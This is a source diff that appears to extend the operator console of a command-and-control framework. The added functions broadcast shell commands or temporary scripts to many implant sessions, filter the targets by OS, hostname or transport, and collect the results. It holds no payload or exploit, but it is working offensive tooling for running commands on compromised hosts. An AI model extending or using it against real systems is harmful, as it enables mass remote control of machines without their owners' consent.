@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -2404,6 +2405,302 @@ func (oc *OperatorConsole) handleExecutePE(implantID string, args []string) {
 	if err := oc.SendCommand(implantID, cmd); err != nil {
 		fmt.Printf("%s Command failed: %v\n", colorize("[!]", colorRed), err)
 	}
+}
+
+// handleBroadcastCommand executes a command across multiple sessions with filtering
+func (oc *OperatorConsole) handleBroadcastCommand(command, osFilter, hostnameFilter, transportFilter string, timeout int32, dryRun, wait, isScript bool, scriptExtension, outputFile string) {
+	if oc.client == nil {
+		fmt.Printf("%s Not connected to server\n", colorize("[!]", colorRed))
+		return
+	}
+
+	// Build the filter
+	filter := &pb.BroadcastFilter{
+		Os:              osFilter,
+		HostnamePattern: hostnameFilter,
+		Transport:       transportFilter,
+	}
+
+	// Dry-run mode: just show matching sessions
+	if dryRun {
+		fmt.Printf("%s Dry-run mode: showing matching sessions for command %q\n",
+			colorize("[*]", colorBlue), command)
+		oc.showMatchingSessions(filter)
+		return
+	}
+
+	// Build the request
+	req := &pb.BroadcastCommandRequest{
+		Filter:          filter,
+		Command:         command,
+		Type:            pb.CommandMessage_SHELL,
+		TimeoutSeconds:  timeout,
+		IsScript:        isScript,
+		ScriptExtension: scriptExtension,
+	}
+
+	if isScript {
+		lines := strings.Count(command, "\n") + 1
+		fmt.Printf("%s Broadcasting script: %d lines (%s)\n",
+			colorize("[*]", colorBlue),
+			lines,
+			colorize("writes to temp file, executes, cleans up", colorDarkGray))
+	} else {
+		fmt.Printf("%s Broadcasting command: %s\n", colorize("[*]", colorBlue), colorize(command, colorCyan))
+	}
+
+	// Show filter info
+	var filterParts []string
+	if osFilter != "" {
+		filterParts = append(filterParts, fmt.Sprintf("OS=%s", osFilter))
+	}
+	if hostnameFilter != "" {
+		filterParts = append(filterParts, fmt.Sprintf("hostname=%s", hostnameFilter))
+	}
+	if transportFilter != "" {
+		filterParts = append(filterParts, fmt.Sprintf("transport=%s", transportFilter))
+	}
+	if len(filterParts) > 0 {
+		fmt.Printf("%s Filters: %s\n", colorize("[*]", colorBlue), strings.Join(filterParts, ", "))
+	} else {
+		fmt.Printf("%s Filters: %s\n", colorize("[*]", colorBlue), colorize("none (all sessions)", colorYellow))
+	}
+
+	// Send broadcast request
+	resp, err := oc.client.BroadcastCommand(context.Background(), req)
+	if err != nil {
+		fmt.Printf("%s Failed to send broadcast: %v\n", colorize("[!]", colorRed), err)
+		return
+	}
+
+	if !resp.Success {
+		fmt.Printf("%s Broadcast failed: %s\n", colorize("[!]", colorRed), resp.Message)
+		return
+	}
+
+	// If wait mode, poll for results before displaying
+	if wait && len(resp.Results) > 0 {
+		fmt.Printf("%s Waiting for results (timeout: %ds)...\n", colorize("[*]", colorBlue), timeout)
+		oc.collectBroadcastResults(resp, timeout)
+	}
+
+	// Display results
+	displayBroadcastResults(resp)
+
+	// Write full outputs to file if specified
+	if outputFile != "" && len(resp.Results) > 0 {
+		oc.writeBroadcastOutputsToFile(resp, outputFile)
+	}
+}
+
+// writeBroadcastOutputsToFile writes the full broadcast outputs to a file
+func (oc *OperatorConsole) writeBroadcastOutputsToFile(resp *pb.BroadcastCommandResponse, outputFile string) {
+	f, err := os.Create(outputFile)
+	if err != nil {
+		fmt.Printf("%s Failed to create output file: %v\n", colorize("[!]", colorRed), err)
+		return
+	}
+	defer f.Close()
+
+	// Write header
+	fmt.Fprintf(f, "=== Broadcast Results ===\n")
+	fmt.Fprintf(f, "Broadcast ID: %s\n", resp.BroadcastId)
+	fmt.Fprintf(f, "Total Sessions: %d\n", resp.TotalSessions)
+	fmt.Fprintf(f, "Commands Sent: %d\n", resp.CommandsSent)
+	fmt.Fprintf(f, "Commands Failed: %d\n", resp.CommandsFailed)
+	fmt.Fprintf(f, "Generated: %s\n", time.Now().Format(time.RFC3339))
+	fmt.Fprintf(f, "\n")
+
+	// Write each session's output
+	for i, result := range resp.Results {
+		fmt.Fprintf(f, "=== Session %d/%d ===\n", i+1, len(resp.Results))
+		fmt.Fprintf(f, "Implant ID: %s\n", result.ImplantId)
+		if result.Codename != "" {
+			fmt.Fprintf(f, "Codename: %s\n", result.Codename)
+		}
+		fmt.Fprintf(f, "Hostname: %s\n", result.Hostname)
+		fmt.Fprintf(f, "Status: %s\n", result.Status)
+		fmt.Fprintf(f, "Command ID: %s\n", result.CommandId)
+		if result.Error != "" {
+			fmt.Fprintf(f, "Error: %s\n", result.Error)
+		}
+		fmt.Fprintf(f, "\n--- Output ---\n")
+		if result.Output != "" {
+			fmt.Fprintf(f, "%s\n", result.Output)
+		} else {
+			fmt.Fprintf(f, "(no output)\n")
+		}
+		fmt.Fprintf(f, "\n")
+	}
+
+	fmt.Printf("%s Full outputs written to: %s\n", colorize("[+]", colorGreen), outputFile)
+}
+
+// showMatchingSessions displays sessions that would match the given filter
+func (oc *OperatorConsole) showMatchingSessions(filter *pb.BroadcastFilter) {
+	sessions, err := oc.GetSessions()
+	if err != nil {
+		fmt.Printf("%s Failed to get sessions: %v\n", colorize("[!]", colorRed), err)
+		return
+	}
+
+	var matched []*Session
+	for _, session := range sessions {
+		if oc.sessionMatchesFilter(session, filter) {
+			matched = append(matched, session)
+		}
+	}
+
+	if len(matched) == 0 {
+		fmt.Printf("%s No sessions match the filter criteria\n", colorize("[!]", colorYellow))
+		return
+	}
+
+	fmt.Printf("\n%s %d session(s) would match:\n\n", colorize("[+]", colorGreen), len(matched))
+	printSessionsTable(matched)
+}
+
+// sessionMatchesFilter checks if a session matches the filter criteria (client-side)
+func (oc *OperatorConsole) sessionMatchesFilter(session *Session, filter *pb.BroadcastFilter) bool {
+	if filter == nil {
+		return true
+	}
+
+	// Check OS filter
+	if filter.Os != "" && !strings.EqualFold(session.OS, filter.Os) {
+		return false
+	}
+
+	// Check hostname pattern
+	if filter.HostnamePattern != "" {
+		matched, err := regexp.MatchString(filter.HostnamePattern, session.Hostname)
+		if err != nil || !matched {
+			return false
+		}
+	}
+
+	// Check transport
+	if filter.Transport != "" && !strings.EqualFold(session.Transport, filter.Transport) {
+		return false
+	}
+
+	return true
+}
+
+// waitForBroadcastResults polls for results from broadcast commands
+// collectBroadcastResults polls for results and updates the response object
+func (oc *OperatorConsole) collectBroadcastResults(resp *pb.BroadcastCommandResponse, timeout int32) {
+	// Create a map of command ID to result index for fast lookup
+	cmdToIdx := make(map[string]int)
+	var pendingCount int
+
+	for i, result := range resp.Results {
+		if result.Status == "sent" || result.Status == "queued" {
+			cmdToIdx[result.CommandId] = i
+			pendingCount++
+		}
+	}
+
+	if pendingCount == 0 {
+		return
+	}
+
+	// Poll for results
+	startTime := time.Now()
+	maxWait := time.Duration(timeout) * time.Second
+	pollInterval := 2 * time.Second
+	completed := 0
+
+	for time.Since(startTime) < maxWait && completed < pendingCount {
+		for cmdID, idx := range cmdToIdx {
+			// Skip already completed
+			if resp.Results[idx].Status == "completed" {
+				continue
+			}
+
+			resultReq := &pb.CommandResultRequest{
+				CommandId:      cmdID,
+				TimeoutSeconds: 1,
+			}
+
+			resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)
+			if err != nil {
+				continue
+			}
+
+			if resultResp.Ready {
+				resp.Results[idx].Status = "completed"
+				resp.Results[idx].Output = resultResp.Output
+				if resultResp.Error != "" && resultResp.Error != "Pending..." {
+					resp.Results[idx].Error = resultResp.Error
+				}
+				completed++
+				fmt.Printf("\r%s %s: result received                    \n",
+					colorize("[+]", colorGreen),
+					colorize(resp.Results[idx].Codename, colorCyan))
+			}
+		}
+
+		if completed >= pendingCount {
+			break
+		}
+
+		// Show progress
+		fmt.Printf("\r%s Waiting... (%d/%d complete)   ",
+			colorize("[*]", colorBlue),
+			completed,
+			pendingCount)
+
+		time.Sleep(pollInterval)
+	}
+
+	fmt.Printf("\r%s Collected %d/%d results                    \n\n",
+		colorize("[+]", colorGreen),
+		completed,
+		pendingCount)
+}
+
+// handleGetResults fetches and displays the result of a command by ID
+func (oc *OperatorConsole) handleGetResults(commandID string, timeout int32) {
+	if oc.client == nil {
+		fmt.Printf("%s Not connected to server\n", colorize("[!]", colorRed))
+		return
+	}
+
+	fmt.Printf("%s Fetching result for command: %s\n", colorize("[*]", colorBlue), colorize(commandID, colorCyan))
+
+	req := &pb.CommandResultRequest{
+		CommandId:      commandID,
+		TimeoutSeconds: timeout,
+	}
+
+	resp, err := oc.client.GetCommandResult(context.Background(), req)
+	if err != nil {
+		fmt.Printf("%s Failed to get result: %v\n", colorize("[!]", colorRed), err)
+		return
+	}
+
+	if !resp.Ready {
+		fmt.Printf("%s Result not ready yet (still pending)\n", colorize("[*]", colorYellow))
+		fmt.Printf("%s Try again later or increase timeout with --timeout\n", colorize("[*]", colorBlue))
+		return
+	}
+
+	// Display the result
+	fmt.Printf("\n%s Command Result\n", colorize("[+]", colorGreen))
+	fmt.Printf("%s\n", strings.Repeat("─", 50))
+
+	if resp.Output != "" {
+		fmt.Printf("%s\n", resp.Output)
+	} else {
+		fmt.Printf("%s\n", colorize("(no output)", colorDarkGray))
+	}
+
+	if resp.Error != "" && resp.Error != "Pending..." {
+		fmt.Printf("\n%s %s\n", colorize("Error:", colorRed), resp.Error)
+	}
+
+	fmt.Printf("%s\n", strings.Repeat("─", 50))
 }
 
 func (oc *OperatorConsole) handleExecuteBOF(implantID string, args []string) {
